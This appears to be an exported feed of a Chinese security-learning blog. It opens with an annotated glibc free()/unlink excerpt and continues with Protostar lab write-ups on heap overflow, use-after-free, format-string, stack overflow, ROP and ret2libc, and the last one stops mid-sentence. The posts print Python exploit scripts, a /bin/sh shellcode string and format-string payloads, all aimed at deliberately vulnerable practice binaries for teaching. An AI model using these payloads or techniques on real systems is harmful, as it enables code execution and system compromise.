catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0)) { errstr = &quot;invalid fastbin entry (free)&quot;; goto errout; } } /* Consolidate other non-mmapped chunks as they arrive. */ //检查是否是通过mmap()分配的内存 else if (!chunk_is_mmapped(p)) { if (! have_lock) { __libc_lock_lock (av-&gt;mutex); locked = 1; } nextchunk = chunk_at_offset(p, size);//返回下一个chunk的地址 /* Lightweight tests: check whether the block is already the top block. */ //检查下一个是否为top-chunk if (__glibc_unlikely (p == av-&gt;top)) { errstr = &quot;double free or corruption (top)&quot;; goto errout; } /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect (contiguous (av) &amp;&amp; (char *) nextchunk &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0)) { errstr = &quot;double free or corruption (out)&quot;; goto errout; } /* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) { errstr = &quot;double free or corruption (!prev)&quot;; goto errout; } nextsize = chunksize(nextchunk); if (__builtin_expect (chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) { errstr = &quot;free(): invalid next size (normal)&quot;; goto errout; } free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); /* 与后面chunk一个合并 */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);//将后一个chunk从双向链表上取下来 } if (nextchunk != av-&gt;top) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); /* 与前面chunk一个合并*/ if (!nextinuse) { unlink(av, nextchunk, bck, fwd);//将前一个chunk从双向链表上取下来 size += nextsize; } else clear_inuse_bit_at_offset(nextchunk, 0); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) { errstr = &quot;free(): corrupted unsorted chunks&quot;; goto errout; } p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size)) { p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; } bck-&gt;fd = p; fwd-&gt;bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); } /* 如果当前chunk正好与topchunk相邻，则合并到topchunk */ else { size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; check_chunk(av, p); } /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don&#39;t know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don&#39;t want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) { if (have_fastchunks(av)) malloc_consolidate(av); if (av == &amp;main_arena) { #ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av); #endif } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-&gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); } } if (! have_lock) { assert (locked); __libc_lock_unlock (av-&gt;mutex); } } /* If the chunk was allocated via mmap, release via munmap(). */ else { munmap_chunk (p); } } 这里看看unlink()宏定义 #define unlink( P, BK, FD ) { BK = P-&gt;bk; FD = P-&gt;fd; FD-&gt;bk = BK; //可能会造成任意写 BK-&gt;fd = FD; } 现在我们重点放在unlink()，当两个相邻chunk需要合并的时候，势必需要将临近的chunk从原来的双链表上取下来，然后与当前chunk合并成一个更大的块。等等！怎么取下来的呢？如果这里存在一个恶意的chunk即fd和bk都是一些恶意地址指针，则会出现任意地址写的一个漏洞。在这里我们就先不去讨论进一步的利用过程，只需知道存在一个这样的漏洞即可，后面会根据这个分析去漏洞利用。 glibc/malloc.c源码 0x06 参考 Vudo malloc tricks A Memory Allocator Once upon a free()","tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"},{"name":"heap","slug":"heap","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"},{"name":"malloc","slug":"malloc","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/malloc/"},{"name":"free","slug":"free","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/free/"}]},{"title":"Protostar-堆溢出学习-UAF(use after free)","date":"2017-04-21T03:12:19.000Z","path":"2017/04/21/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/","text":"0x00 序 下面看一个堆中常见的漏洞-UAF(use after free) 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; struct auth { char name[32]; int auth; }; struct auth *auth; char *service; int main(int argc, char **argv) { char line[128]; while(1) { printf(&quot;[ auth = %p, service = %p ]\\n&quot;, auth, service); if(fgets(line, sizeof(line), stdin) == NULL) break; if(strncmp(line, &quot;auth &quot;, 5) == 0) { auth = malloc(sizeof(auth)); memset(auth, 0, sizeof(auth)); if(strlen(line + 5) &lt; 31) { strcpy(auth-&gt;name, line + 5); } } if(strncmp(line, &quot;reset&quot;, 5) == 0) { free(auth); } if(strncmp(line, &quot;service&quot;, 6) == 0) { service = strdup(line + 7); } if(strncmp(line, &quot;login&quot;, 5) == 0) { if(auth-&gt;auth) { printf(&quot;you have logged in already!\\n&quot;); } else { printf(&quot;please enter your password\\n&quot;); } } } } 0x02 分析&amp;思考程序有4个命令，对auth这个结构体进行分配内存以及释放内存，然后有结构体里的auth-&gt;auth来决定是否授权。很明显让我们修改auth-&gt;auth的值。reset命令释放auth但没有设为null，后面auth-&gt;auth发生引用。所以这里有个UAF漏洞。 0x03 调试&amp;hack1.在第一个printf处下个断点，观察每次分配和释放后堆，auth以及service的情况 2.先输入auth admin，然后输入login试试3.再输入reset释放堆内存4.输入service分配内存5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖auth-&gt;auth的内存值。6.再次输入login命令 0x04 一点感受通过这个例子简单的学习了UAF漏洞后，无疑free后不设为null，后果是不敢想象的。继续学习堆相关的漏洞利用。keep hack！","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"UAF","slug":"UAF","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/UAF/"}]},{"title":"Protostar-堆溢出学习-strcpy堆指针造成任意地址GOT表写","date":"2017-04-19T03:12:19.000Z","path":"2017/04/19/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/","text":"0x00 序 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; struct internet { int priority; char *name; }; void winner() { printf(&quot;and we have a winner @ %d\\n&quot;, time(NULL)); } int main(int argc, char **argv) { struct internet *i1, *i2, *i3; i1 = malloc(sizeof(struct internet)); i1-&gt;priority = 1; i1-&gt;name = malloc(8); i2 = malloc(sizeof(struct internet)); i2-&gt;priority = 2; i2-&gt;name = malloc(8); strcpy(i1-&gt;name, argv[1]); strcpy(i2-&gt;name, argv[2]); printf(&quot;and that&#39;s a wrap folks!\\n&quot;); } 0x02 简单的分析&amp;思考如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个strcpy，肯定是要去覆盖和修改某个地方的地址。其实strcpy这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。在这个列子中，我们就借此去修改printf函数的GOT表。 0x03 调试1.查看堆分配情况2.查看汇编代码，找到执行入口3.首先利用第一个strcpy将i2的name指针改为GOT表地址，然后利用第二个strcpy向这个地址写入winner的地址，由此编写对应的Python PoC import struct padding = &quot;AAAA&quot;*5 put_got = struct.pack(&quot;I&quot;, 0x8049774) #put的GOT表地址 space = &quot; &quot; winner = struct.pack(&quot;I&quot;, 0x8048494) #winner函数地址 print padding+put_got+space+winner 4.hack user@protostar:/tmp$ /opt/protostar/bin/heap1 `python heap1.py` and we have a winner @ 1492452139 成功执行winner函数 0x04 一点感受学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将strcpy改为strncpy或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"strcpy","slug":"strcpy","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/strcpy/"},{"name":"GOT表","slug":"GOT表","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/GOT表/"}]},{"title":"Protostar-堆溢出学习-覆盖堆函数指针劫持代码流","date":"2017-04-18T03:12:19.000Z","path":"2017/04/18/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/","text":"0x00 序 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。 0x01 C语言源代码C代码 #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; struct data { char name[64]; }; struct fp { int (*fp)(); }; void winner() { printf(&quot;level passed\\n&quot;); } void nowinner() { printf(&quot;level has not been passed\\n&quot;); } int main(int argc, char **argv) { struct data *d; struct fp *f; d = malloc(sizeof(struct data)); f = malloc(sizeof(struct fp)); f-&gt;fp = nowinner; printf(&quot;data is at %p, fp is at %p\\n&quot;, d, f); strcpy(d-&gt;name, argv[1]); f-&gt;fp(); } 0x02 简单分析&amp;思考先在堆上分配了一个data和fp的结构体，然后使fp指向nowinner函数，然后打印对应分配的堆地址，以及将argv[1]复制到data结构体，最后调用nowinner函数。 可以知道我们需要去执行winner函数，怎么做到呢？ 由于strcpy没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为winner函数？Here we go！ 0x03 malloc()在继续分析之前，我们先来简单的介绍一下malloc函数，在这里malloc函数更多是对mmap系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用mmap来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。 那是如何管理堆的呢？见下 堆标志 分配大小 malloc返回地址addr 00000000 00000011 00000000 00000000 00000000 00000031 AAAAAAAA BBBBBBBB CCCCCCCC DDDDDDDD EEEEEEEE FFFFFFFF … … … … 00000000 00000011 00000000 00000000 每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过addr-4拿到自身的分配大小从而决定下次分配的选择 注：分配大小的第一位表示前面的内存块是否在使用 0x04 调试&amp;hack通过前面的分析，我们的目的很明确，需要通过strcpy(d-&gt;name, argv[1]);去重写fp结构体里面的函数指针，使其为winner函数的地址。 1.利用gdb查看strcpy前后堆的情况我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的nowinner地址改为winner地址 2.查看winner地址，重写fp函数指针 (gdb) p winner $1 = {void (void)} 0x8048464 &lt;winner&gt; 3.PoC Python脚本 import struct padding = &quot;A&quot;*64 #填充data head = &quot;BBBB&quot; # not care head += &quot;CCCC&quot; # not care winner = struct.pack(&quot;I&quot;, 0x8048464) #将nowinner地址改为winner地址 print padding+head+winner 4.hack成功执行winner函数!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"}]},{"title":"Protostar-栈溢出学习-printf格式%n任意地址写","date":"2017-04-17T03:12:19.000Z","path":"2017/04/17/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/","text":"0x00 序 从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int target; void vuln(char *string) { printf(string); if(target) { printf(&quot;you have modified the target :)\\n&quot;); } } int main(int argc, char **argv) { vuln(argv[1]); } 0x02 疑惑&amp;分析&amp;思考拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量target的值。但好像除了printf()函数，就没有其他可疑的地方了。what fuck？ 一个printf()函数怎么会有漏洞？ 但仔细观察可以发现这次printf的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？ 0x03 测试其他不说，先运行下程序试试再试着输入格式字符试试很奇怪，我们貌似得到一些栈中的值，再多打印一些试试可以看到后面打印出来了%x本身&lt;—20782520，通过linux stack layout可得知后面的确保存着参数字符串 ... local variables of main saved registers of main return address of main argc argv envp stack from startup code argc argv pointers NULL that ends argv[] environment pointers NULL that ends envp[] ELF Auxiliary Table argv strings &lt;--------focus here environment strings program name NULL 更多关于linux栈布局 0x04 你不知道的printf虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？ 关注printf函数，有这么一段话： Code such as printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole. 简单就是说%n可以写入一个内存地址，其值为前面的字符数 [n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is con‐verted. 看个例子这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了 0x05 hack先利用objdump -t找到target的地址利用一句话Python反复测试 /opt/protostar/bin/format1 &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\\x38\\x96\\x04\\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*135&quot;&#39;`&quot; 调整%x的个数，使其target地址为最后一个然后将最后一个%x改为%n /opt/protostar/bin/format1 &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\\x38\\x96\\x04\\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*134+&quot;%n &quot;&#39;`&quot; run!成功修改target值! 0x06 一点感悟总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！ 0x07 参考链接 更多关于linux栈布局 What is the use of the %n format specifier in C? Protostar/Format 1","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"printf","slug":"printf","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/printf/"},{"name":"format","slug":"format","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/format/"}]},{"title":"Protostar-栈溢出学习-ROP执行shellcode","date":"2017-04-16T03:12:19.000Z","path":"2017/04/16/Protostar-栈溢出系列学习-Stack 3/Protostar-栈溢出系列学习-Stack 3/","text":"0x00 序 和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。 0x01 stack3#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\\n&quot;, ret); _exit(1); } printf(&quot;got path %s\\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } 0x02 思路&amp;分析整体上和前面的没太大区别，现在有个问题在于__builtin_return_address()会返回当前的返回地址值，然后后面ret &amp; 0xbf000000) == 0xbf000000对其返回地址进行了限制–返回地址不能是0xbf为前缀，正好是栈的前缀。这样的话就不能像之前那样直接返回到栈中，也不能执行栈上的shellcode。 怎么绕过呢？ Ret2libc or ROP(return orientated programming) 0x03 ROP一个巧妙的方法在于我们不直接返回到栈中执行shellcode，而是返回到原本的程序之中。这里我们返回到getpath()的ret指令处。在后面在存放shellcode，而再次执行ret时就会跳转到后面执行我们的shellcode。 getpath()汇编Dump of assembler code for function getpath: 0x08048484 &lt;getpath+0&gt;: push ebp 0x08048485 &lt;getpath+1&gt;: mov ebp,esp 0x08048487 &lt;getpath+3&gt;: sub esp,0x68 0x0804848a &lt;getpath+6&gt;: mov eax,0x80485d0 0x0804848f &lt;getpath+11&gt;: mov DWORD PTR [esp],eax 0x08048492 &lt;getpath+14&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x08048497 &lt;getpath+19&gt;: mov eax,ds:0x8049720 0x0804849c &lt;getpath+24&gt;: mov DWORD PTR [esp],eax 0x0804849f &lt;getpath+27&gt;: call 0x80483b0 &lt;fflush@plt&gt; 0x080484a4 &lt;getpath+32&gt;: lea eax,[ebp-0x4c] 0x080484a7 &lt;getpath+35&gt;: mov DWORD PTR [esp],eax 0x080484aa &lt;getpath+38&gt;: call 0x8048380 &lt;gets@plt&gt; 0x080484af &lt;getpath+43&gt;: mov eax,DWORD PTR [ebp+0x4] 0x080484b2 &lt;getpath+46&gt;: mov DWORD PTR [ebp-0xc],eax 0x080484b5 &lt;getpath+49&gt;: mov eax,DWORD PTR [ebp-0xc] 0x080484b8 &lt;getpath+52&gt;: and eax,0xbf000000 0x080484bd &lt;getpath+57&gt;: cmp eax,0xbf000000 0x080484c2 &lt;getpath+62&gt;: jne 0x80484e4 &lt;getpath+96&gt; 0x080484c4 &lt;getpath+64&gt;: mov eax,0x80485e4 0x080484c9 &lt;getpath+69&gt;: mov edx,DWORD PTR [ebp-0xc] 0x080484cc &lt;getpath+72&gt;: mov DWORD PTR [esp+0x4],edx 0x080484d0 &lt;getpath+76&gt;: mov DWORD PTR [esp],eax 0x080484d3 &lt;getpath+79&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x080484d8 &lt;getpath+84&gt;: mov DWORD PTR [esp],0x1 0x080484df &lt;getpath+91&gt;: call 0x80483a0 &lt;_exit@plt&gt; 0x080484e4 &lt;getpath+96&gt;: mov eax,0x80485f0 0x080484e9 &lt;getpath+101&gt;: lea edx,[ebp-0x4c] 0x080484ec &lt;getpath+104&gt;: mov DWORD PTR [esp+0x4],edx 0x080484f0 &lt;getpath+108&gt;: mov DWORD PTR [esp],eax 0x080484f3 &lt;getpath+111&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x080484f8 &lt;getpath+116&gt;: leave 0x080484f9 &lt;getpath+117&gt;: ret 调试&amp;hack测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。 import struct padding = &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39; ret = struct.pack(&quot;I&quot;, 0x080484f9) eip_after_ret = struct.pack(&quot;I&quot;, 0xbffff78c+40) nopslide = &#39;\\x90&#39;*100 payload = &#39;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80&#39; print padding+ret+eip_after_ret+nopslide+payload 这里的ret返回地址我们改为了0x080484f9正是ret指令处的地址。eip_after_ret为真正在栈上跳转的执行地址，当然我们也加入了nopslide。 here we go! 成功运行bash！ 0x04 Ret2libc这次我们通过返回到libc里面的函数达到执行shell的目的。这里采用system(&quot;/bin/sh&quot;)。所以我们需要跳转到system函数，但同时要满足x86传参方式即要先将字符串&quot;/bin/sh&quot;压入栈中。下面我们就来做两件事： * 1，找到system在内存中的地址 * 2，找到字符串`&quot;/bin/sh&quot;`在内存中的地址 system &amp; &quot;/bin/sh&quot; 先找到/lib/libc-2.11.2.so在内存中的位置 然后找到字符串&quot;/bin/sh&quot;在/lib/libc-2.11.2.so中的偏移 验证：所以&quot;/bin/sh&quot;为0xb7fb63bf hack编写对应的Python脚本 import struct padding = &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39; system = struct.pack(&quot;I&quot;,0xb7ecffb0) #system地址 ret_after_system = &#39;AAAA&#39; #返回地址，不重要 bin_sh = struct.pack(&quot;I&quot;, 0xb7fb63bf) #参数/bin/sh地址 print padding+system+ret_after_system+bin_sh 测试 cooooool! make it!0x05 小结学习到现在，一句话总结就是：你知道得越多才知道知道得越少。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-ret跳转到自定义shellcode","date":"2017-04-15T03:12:19.000Z","path":"2017/04/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/","text":"0x00 序 经过前面的学习，我们已经了解了简单的栈溢出利用手段，建议看本文章前先看下前面的分析。这次我们来做点有趣的事，我们引入shellcode。 0x01 C语言源代码Stack5 is a standard buffer overflow, this time introducing shellcode. This level is at /opt/protostar/bin/stack5 Hints:At this point in time, it might be easier to use someone elses shellcodeIf debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debuggerremove the int3s once your shellcode is done. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } 0x02 思路&amp;分析和前面的一样，我们可以通过覆盖返回地址然后由ret指令跳转到目标地址，但这次我们没有了win()函数，那我们应该跳转到哪里呢？没错，还是跳到栈上。要达到执行代码的目的，所以我们需要在栈上写入shellcode。Here we go！ 0x03 调试&amp;hack 对应汇编，我们在0x080483da &lt;main+22&gt;: ret处下个断点 (gdb) disassemble Dump of assembler code for function main: 0x080483c4 &lt;main+0&gt;: push %ebp 0x080483c5 &lt;main+1&gt;: mov %esp,%ebp 0x080483c7 &lt;main+3&gt;: and $0xfffffff0,%esp 0x080483ca &lt;main+6&gt;: sub $0x50,%esp 0x080483cd &lt;main+9&gt;: lea 0x10(%esp),%eax 0x080483d1 &lt;main+13&gt;: mov %eax,(%esp) 0x080483d4 &lt;main+16&gt;: call 0x80482e8 &lt;gets@plt&gt; 0x080483d9 &lt;main+21&gt;: leave 0x080483da &lt;main+22&gt;: ret 同样的方法，Python脚本测试返回地址 可以发现0xbffff79c处正是返回地址，对应到TTTT,我需要在TTTT处写上我们要跳转的地址。 既然题目中说了用int 3 cc指令那我们就先来测试下–[cc指令（见文章末尾）]我们成功执行了cc INT 3指令并触发 SIGTRAP 引入nop slide为什么需要nop slide?来看看这种情况，我们再启动一个终端去调试。发现地址里面内容一样，但地址却不同，为什么会这样呢？再看看整个栈的情况可以发现，在圈中之后的栈地址都相同，但由于工作路径不同，导致前面的栈地址都发生了变化。因此，我们需要引入nop slide去解决这种情况。 填写shellcode自此，我们可以加入我们的shellcode了。这里我用的这里的shellcode。 现在我们重新编写Python脚本，制作shellcode payload 我们已经跳转的地址已经变化了40字节，并加入100的nopslide偏移，然后再执行shellcode 运行测试的确执行了dash，但并没有出现运行结果，这里很容易困惑。不应该这样的啊？经过思考，原来我们执行了/bin/dash后，并没有输入任何数据，所以就退出了。 那怎么才能让执行后输入数据呢？这里有一个小技巧，在执行后用cat指令，将输入转到输出 so cool! make it!0x04 附录INT 3 CC 详细分分析可以看这边文章int 3中断与软件调试 简单的理解就是:当我们调试程序时，可以在可能有问题的地方插入一条INT 3指令，使CPU执行到这一点时停下来。这便是软件调试中经常用到的断点（breakpoint）功能，因此INT 3指令又被称为断点指令。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip","date":"2017-04-13T03:12:19.000Z","path":"2017/04/13/Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 1/","text":"0x00 序 接着之前的系列，下面研究两种控制eip的方式 0x01 C语言源代码Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP) Hints:both gdb and objdump is your friend you determining where the win() function lies in memory. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\\n&quot;); } int main(int argc, char **argv) { volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) { printf(&quot;calling function pointer, jumping to 0x%08x\\n&quot;, fp); fp(); } } 在main函数下断点，分析可知，1处为fp的地址，2处为fp()的调用，我们需要覆盖掉esp+0x5c处所存的函数指针值，使其跳转到win()函数 利用Python编写exp测试脚本，可以发现QQQQ覆盖了函数指针 重新编写exp,将QQQQ改为win()函数的地址，即可实现自定义调用，控制eip 成功执行win()函数 0x02 通过ret指令控制eipStack4 takes a look at overwriting saved EIP and standard buffer overflows. This level is at /opt/protostar/bin/stack4 Hints:A variety of introductory papers into buffer overflows may help.gdb lets you do “run &lt; input”EIP is not directly after the end of buffer, compiler padding can also increase the size. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\\n&quot;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } 先分析一下，可以发现这个程序很简单，看上去没有可以直接控制eip的方法，但函数的调用过程在结束的时候会将保存的返回地址存在栈中，ret指令的时候会将传给eip。所以我们可以覆盖对应的返回地址值达到控制eip ______________ | | &lt;---esp -------------- | 局部变量1 | -------------- | 局部变量2 | -------------- | ... | -------------- | | &lt;---new ebp -------------- | old ebp | -------------- | 返回地址 | ret --------&gt; eip -------------- 和前面一样，这次我们之间利用Python编写exp测试脚本，可以发现SSSS覆盖了old ebp，TTTT覆盖了返回地址 我们查看win()的地址，重新编写对应exp，然后将TTTT改为其地址，成功达到目的。 成功执行win()函数","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-简单栈溢出修改局部变量值","date":"2017-04-11T03:12:19.000Z","path":"2017/04/11/Protostar-栈溢出系列学习-Stack 0/Protostar-栈溢出系列学习-Stack 0/","text":"0x01 序 为了加强自己在漏洞利用方面的能力，准备做一个栈溢出和堆溢出利用的系列学习，从最简单的栈溢出学习开始，学习平台是本地搭建的一个基于linux系统的Protostar学习虚拟机环境，里面有从易到难的示例溢出漏洞程序。那就开始吧！ 0x01 Protostar虚拟机环境搭建虚拟机下载地址 虚拟机环境搭建视频教程 默认用户名和密码: user:user root:godmode 虚拟机启动后，输入bash进入终端界面 漏洞程序在/opt/protostar/bin目录下 0x01 C语言源代码This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution. This level is at /opt/protostar/bin/stack0 #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&quot;you have changed the &#39;modified&#39; variable\\n&quot;); } else { printf(&quot;Try again?\\n&quot;); } } 0x02 思路&amp;分析这个栈溢出很简单，首先在栈上分配了64字节大小的空间，然后根据modified的值来决定执行流程，但modified始终等于0。所以我们需要利用栈溢出去修改modified的值。 0x03 调试&amp;利用 gdb连接到stack0，下break *main在main函数上下断点，然后set disassembly-flavor intel设置intel汇编指令格式,在0x08048411出下个断点 利用define 